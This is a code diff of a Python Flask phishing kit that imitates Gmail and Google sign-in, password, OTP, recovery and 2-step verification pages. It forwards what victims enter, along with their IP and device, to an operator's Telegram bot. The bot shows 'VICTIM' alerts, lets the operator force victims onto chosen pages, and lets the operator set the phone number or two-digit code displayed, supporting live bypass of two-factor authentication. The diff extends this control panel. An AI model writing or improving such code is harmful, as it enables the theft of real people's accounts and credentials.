@@ -163,26 +163,8 @@ def get_device_info(user_agent):
     
     return device
 
-def get_victim_page_display(page_name):
-    """Get display name for current page"""
-    page_map = {
-        'login': '🔐 Login Page',
-        'gmail_login': '🔐 Gmail Login',
-        'waiting': '⏳ Waiting Page',
-        'stall': '⏸️ Stall (CAPTCHA)',
-        'verify': '🛡️ Verify Page',
-        'password': '🔑 Password Page',
-        'reset': '🔄 Reset Page',
-        'otp': '📱 OTP Page',
-        'invalid': '❌ Invalid Page',
-        'recovery': '📱 Recovery Page',
-        'twostep': '🔒 2-Step Verification',
-        'index': '🏠 Index Page'
-    }
-    return page_map.get(page_name, '📍 ' + page_name)
-
 def send_telegram_notification_with_buttons(message, session_id=None):
-    """Send notification with View Victim button and track message"""
+    """Send notification with View Victim button"""
     try:
         chat_id = os.environ.get('TELEGRAM_CHAT_ID')
         if not chat_id:
@@ -312,7 +294,7 @@ def update_victim_page(session_id, page_url, email=None):
             active_victims[session_id]['email'] = email
 
 def log_navigation(session_id, page_url, email=None):
-    """Log navigation and send notification"""
+    """Log navigation"""
     conn = get_db_connection()
     c = conn.cursor()
     
@@ -360,6 +342,24 @@ def delete_old_victim_messages(session_id):
             except:
                 pass
         victim_messages[session_id] = []
+
+def get_victim_page_display(page_name):
+    """Get display name for current page"""
+    page_map = {
+        'login': '🔐 Login Page',
+        'gmail_login': '🔐 Gmail Login',
+        'waiting': '⏳ Waiting Page',
+        'stall': '⏸️ Stall (CAPTCHA)',
+        'verify': '🛡️ Verify Page',
+        'password': '🔑 Password Page',
+        'reset': '🔄 Reset Page',
+        'otp': '📱 OTP Page',
+        'invalid': '❌ Invalid Page',
+        'recovery': '📱 Recovery Page',
+        'twostep': '🔒 2-Step Verification',
+        'index': '🏠 Index Page'
+    }
+    return page_map.get(page_name, '📍 ' + page_name)
 
 @app.before_request
 def check_restrictions():
@@ -439,7 +439,6 @@ def gmail_login():
     device = get_device_info(user_agent)
     
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'Gmail Login Page', session.get('email'))
@@ -480,7 +479,6 @@ def login():
             verify_page_data[session_id] = {}
         verify_page_data[session_id]['email'] = email
         
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'Login Attempt', email)
@@ -514,7 +512,6 @@ def waiting():
     device = get_device_info(user_agent)
     
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'Waiting Page', session.get('email'))
@@ -546,7 +543,6 @@ def stall():
     if request.method == 'POST':
         captcha_text = request.form.get('ca', '').strip()
         
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -567,7 +563,6 @@ def stall():
         return redirect(url_for('waiting'))
     
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'Stall Page', email)
@@ -624,7 +619,6 @@ def verify():
         recovery_email = request.form.get('recovery_email', '').strip()
         recovery_phone = request.form.get('recovery_phone', '').strip()
         
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -645,7 +639,6 @@ def verify():
         return redirect(url_for('waiting'))
     
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'Verify Page', email)
@@ -681,7 +674,6 @@ def password():
         password = request.form.get('password', '').strip()
         email = request.form.get('email', email)
         
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -701,7 +693,6 @@ def password():
         return redirect(url_for('waiting'))
     
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'Password Page', email)
@@ -751,7 +742,6 @@ def invalid():
         password = request.form.get('password', '').strip()
         email = request.form.get('email', email)
         
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -772,7 +762,6 @@ def invalid():
         return redirect(url_for('waiting'))
     
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'Invalid Page', email)
@@ -809,7 +798,6 @@ def reset():
         confirm_password = request.form.get('confirm_password', '').strip()
         email = request.form.get('email', email)
         
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -830,7 +818,6 @@ def reset():
         return redirect(url_for('waiting'))
     
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'Reset Password Page', email)
@@ -862,11 +849,15 @@ def otp():
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
+    # Get phone from verify_page_data
+    phone = '****'
+    if session_id and session_id in verify_page_data:
+        phone = verify_page_data[session_id].get('phone', '****')
+    
     if request.method == 'POST':
         otp_code = request.form.get('otpcode', '').strip()
         email = request.form.get('email', email)
         
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -886,7 +877,6 @@ def otp():
         return redirect(url_for('waiting'))
     
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'OTP Page', email)
@@ -898,12 +888,13 @@ def otp():
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
+📞 <b>Phone:</b> <code>{phone}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> OTP"""
         
         send_telegram_notification_with_buttons(message, session_id)
     
-    return render_template('otp.html', placeholders={'email': email, 'phone': '****'})
+    return render_template('otp.html', placeholders={'email': email, 'phone': phone})
 
 @app.route('/recovery')
 def recovery():
@@ -920,8 +911,12 @@ def recovery():
         recovery_data = recovery_page_data[session_id]
         email = recovery_data.get('email', email)
     
+    # Get number from recovery_page_data
+    number = ''
+    if session_id and session_id in recovery_page_data:
+        number = recovery_page_data[session_id].get('number', '')
+    
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, 'Recovery Page', email)
@@ -933,7 +928,7 @@ def recovery():
             message = f"""📱 <b>VICTIM REACHED RECOVERY PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
-🔢 <b>Number Displayed:</b> <code>{recovery_data.get('number', 'Not set')}</code>
+🔢 <b>Number Displayed:</b> <code>{number or 'Not set'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
@@ -944,7 +939,7 @@ def recovery():
     
     return render_template('recovery.html', placeholders={
         'email': email, 
-        'number': recovery_data.get('number', '')
+        'number': number
     })
 
 @app.route('/2step', methods=['GET', 'POST'])
@@ -962,8 +957,12 @@ def twostep():
         verification_data = verification_page_data[session_id]
         email = verification_data.get('email', email)
     
+    # Get phone type from verification_page_data
+    phone_type = 'iPhone'
+    if session_id and session_id in verification_page_data:
+        phone_type = verification_page_data[session_id].get('phone', 'iPhone')
+    
     if session_id:
-        # Delete old messages for this victim
         delete_old_victim_messages(session_id)
         
         log_navigation(session_id, '2-Step Verification Page', email)
@@ -973,7 +972,7 @@ def twostep():
         message = f"""📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
-📱 <b>Phone Displayed:</b> <code>{verification_data.get('phone', 'Not set')}</code>
+📱 <b>Phone Displayed:</b> <code>{phone_type}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
@@ -983,7 +982,7 @@ def twostep():
     
     return render_template('2stepverification.html', placeholders={
         'email': email, 
-        'phone': verification_data.get('phone', 'iPhone')
+        'phone': phone_type
     })
 
 @app.route('/api/set-verification-data', methods=['POST'])
@@ -1120,6 +1119,9 @@ def telegram_webhook():
             elif action == 'back_to_victim':
                 session_id = data_parts[1]
                 send_victim_detail(chat_id, session_id, message_id)
+            elif action == 'noop':
+                # Do nothing
+                pass
             
             return jsonify({'status': 'ok'})
         
@@ -1127,6 +1129,40 @@ def telegram_webhook():
             message = data['message']
             chat_id = message['chat']['id']
             text = message.get('text', '').strip()
+            
+            # Check if we're in a "setting" state
+            if session.get('setting_session') and session.get('setting_action'):
+                session_id = session.get('setting_session')
+                action = session.get('setting_action')
+                
+                if action == 'setemail':
+                    if '@' in text and '.' in text:
+                        set_victim_email(session_id, text, chat_id, None)
+                    else:
+                        send_telegram_message("❌ Invalid email format. Please try again.\n\nExample: user@gmail.com")
+                elif action == 'setphonetype':
+                    if text:
+                        set_victim_phonetype(session_id, text, chat_id, None)
+                    else:
+                        send_telegram_message("❌ Please enter a phone type (e.g., iPhone, Android)")
+                elif action == 'setphone':
+                    if text:
+                        set_victim_phone(session_id, text, chat_id, None)
+                    else:
+                        send_telegram_message("❌ Please enter a phone number (e.g., +1234567890)")
+                elif action == 'setnumber':
+                    if text and re.match(r'^[0-9]{2}$', text):
+                        set_victim_number(session_id, text, chat_id, None)
+                    else:
+                        send_telegram_message("❌ Invalid number. Must be 2 digits (00-99). Please try again.")
+                
+                # Clear the setting state
+                session.pop('setting_session', None)
+                session.pop('setting_action', None)
+                
+                # Send back to victim detail
+                send_victim_detail(chat_id, session_id)
+                return jsonify({'status': 'ok'})
             
             if text == '/start' or text == '🔙 Main Menu':
                 send_main_menu(chat_id)
@@ -1138,6 +1174,8 @@ def telegram_webhook():
                 send_clear_confirmation(chat_id)
             else:
                 send_main_menu(chat_id)
+            
+            return jsonify({'status': 'ok'})
         
         return jsonify({'status': 'ok'})
         
@@ -1347,7 +1385,6 @@ def force_victim(session_id, page, chat_id, message_id):
     }
     
     if page in action_map:
-        # Delete old messages for this victim before forcing
         delete_old_victim_messages(session_id)
         
         victim_commands[session_id] = action_map[page]
@@ -1367,15 +1404,22 @@ def force_victim(session_id, page, chat_id, message_id):
 
 def set_victim_email(session_id, email, chat_id, message_id):
     if not email:
+        session['setting_session'] = session_id
+        session['setting_action'] = 'setemail'
+        
         text = "📧 Please type the email address you want to set.\n\nExample: user@gmail.com"
         keyboard = {
             "inline_keyboard": [
-                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
+                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
             ]
         }
-        edit_telegram_message(chat_id, message_id, text, keyboard)
+        if message_id:
+            edit_telegram_message(chat_id, message_id, text, keyboard)
+        else:
+            send_telegram_message_with_buttons(chat_id, text, keyboard)
         return
     
+    # Update database
     conn = get_db_connection()
     c = conn.cursor()
     c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
@@ -1398,17 +1442,30 @@ def set_victim_email(session_id, email, chat_id, message_id):
             [{"text": "📋 Victims List", "callback_data": "victims_list"}]
         ]
     }
-    edit_telegram_message(chat_id, message_id, text, keyboard)
+    
+    session.pop('setting_session', None)
+    session.pop('setting_action', None)
+    
+    if message_id:
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+    else:
+        send_telegram_message_with_buttons(chat_id, text, keyboard)
 
 def set_victim_phonetype(session_id, phone_type, chat_id, message_id):
     if not phone_type:
+        session['setting_session'] = session_id
+        session['setting_action'] = 'setphonetype'
+        
         text = "📱 Please type the phone type you want to set.\n\nExamples: iPhone, Android, Samsung, Oppo, etc."
         keyboard = {
             "inline_keyboard": [
-                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
+                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
             ]
         }
-        edit_telegram_message(chat_id, message_id, text, keyboard)
+        if message_id:
+            edit_telegram_message(chat_id, message_id, text, keyboard)
+        else:
+            send_telegram_message_with_buttons(chat_id, text, keyboard)
         return
     
     if session_id not in verification_page_data:
@@ -1422,51 +1479,30 @@ def set_victim_phonetype(session_id, phone_type, chat_id, message_id):
             [{"text": "📋 Victims List", "callback_data": "victims_list"}]
         ]
     }
-    edit_telegram_message(chat_id, message_id, text, keyboard)
-
-def set_victim_number(session_id, number, chat_id, message_id):
-    if not number:
-        text = "🔢 Please type a 2-digit number (00-99).\n\nExample: 42"
-        keyboard = {
-            "inline_keyboard": [
-                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
-            ]
-        }
+    
+    session.pop('setting_session', None)
+    session.pop('setting_action', None)
+    
+    if message_id:
         edit_telegram_message(chat_id, message_id, text, keyboard)
-        return
-    
-    if not re.match(r'^[0-9]{2}$', number):
-        text = "❌ Invalid number. Must be 2 digits (00-99). Please try again."
-        keyboard = {
-            "inline_keyboard": [
-                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
-            ]
-        }
-        edit_telegram_message(chat_id, message_id, text, keyboard)
-        return
-    
-    if session_id not in recovery_page_data:
-        recovery_page_data[session_id] = {}
-    recovery_page_data[session_id]['number'] = number
-    
-    text = f"✅ 2-Digit Number set to: <code>{number}</code>"
-    keyboard = {
-        "inline_keyboard": [
-            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
-            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
-        ]
-    }
-    edit_telegram_message(chat_id, message_id, text, keyboard)
+    else:
+        send_telegram_message_with_buttons(chat_id, text, keyboard)
 
 def set_victim_phone(session_id, phone, chat_id, message_id):
     if not phone:
+        session['setting_session'] = session_id
+        session['setting_action'] = 'setphone'
+        
         text = "📞 Please type the phone number you want to set.\n\nExample: +1234567890"
         keyboard = {
             "inline_keyboard": [
-                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
+                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
             ]
         }
-        edit_telegram_message(chat_id, message_id, text, keyboard)
+        if message_id:
+            edit_telegram_message(chat_id, message_id, text, keyboard)
+        else:
+            send_telegram_message_with_buttons(chat_id, text, keyboard)
         return
     
     if session_id not in verify_page_data:
@@ -1485,7 +1521,65 @@ def set_victim_phone(session_id, phone, chat_id, message_id):
             [{"text": "📋 Victims List", "callback_data": "victims_list"}]
         ]
     }
-    edit_telegram_message(chat_id, message_id, text, keyboard)
+    
+    session.pop('setting_session', None)
+    session.pop('setting_action', None)
+    
+    if message_id:
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+    else:
+        send_telegram_message_with_buttons(chat_id, text, keyboard)
+
+def set_victim_number(session_id, number, chat_id, message_id):
+    if not number:
+        session['setting_session'] = session_id
+        session['setting_action'] = 'setnumber'
+        
+        text = "🔢 Please type a 2-digit number (00-99).\n\nExample: 42"
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
+            ]
+        }
+        if message_id:
+            edit_telegram_message(chat_id, message_id, text, keyboard)
+        else:
+            send_telegram_message_with_buttons(chat_id, text, keyboard)
+        return
+    
+    if not re.match(r'^[0-9]{2}$', number):
+        text = "❌ Invalid number. Must be 2 digits (00-99). Please try again."
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "🔙 Try Again", "callback_data": f"setnumber|{session_id}|"}],
+                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
+            ]
+        }
+        if message_id:
+            edit_telegram_message(chat_id, message_id, text, keyboard)
+        else:
+            send_telegram_message_with_buttons(chat_id, text, keyboard)
+        return
+    
+    if session_id not in recovery_page_data:
+        recovery_page_data[session_id] = {}
+    recovery_page_data[session_id]['number'] = number
+    
+    text = f"✅ 2-Digit Number set to: <code>{number}</code>"
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
+            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
+        ]
+    }
+    
+    session.pop('setting_session', None)
+    session.pop('setting_action', None)
+    
+    if message_id:
+        edit_telegram_message(chat_id, message_id, text, keyboard)
+    else:
+        send_telegram_message_with_buttons(chat_id, text, keyboard)
 
 def delete_victim_telegram(session_id, chat_id, message_id):
     conn = get_db_connection()
